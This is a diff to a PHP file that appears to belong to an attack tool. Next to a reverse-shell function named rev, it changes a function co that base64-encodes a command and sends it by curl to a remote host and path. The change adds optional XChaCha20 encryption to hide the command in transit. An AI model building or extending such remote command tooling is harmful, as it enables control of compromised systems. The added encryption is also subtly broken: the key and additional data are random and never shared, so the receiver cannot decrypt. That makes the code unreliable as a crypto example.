@@ -172,10 +172,26 @@ function rev($host, $shell, $port, $os)
 
 }
 
-function co($command, $host, $uri)
+function co($command, $host, $uri, bool $encrypt)
 {
-    if (!empty($host) && !empty($command) && !empty($uri)) {
+    $space_Safe_coms = '';
+    if ($encrypt === true){
+        $plain = $command;
+        $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+        $secure_Key = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
+        $additionalData = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
+        try{
+            $cyphered = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($plain, $additionalData, $our_nonce, $secure_Key);
+            $space_Safe_coms = base64_encode($our_nonce . $cyphered);
+        }catch (SodiumException $exception){
+            echo $exception->getMessage();
+            echo $exception->getTraceAsString();
+            echo $exception->getLine();
+        }
+    }else{
         $space_Safe_coms = base64_encode($command);
+    }
+    if (!empty($host) && !empty($command) && !empty($uri)) {
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
         curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
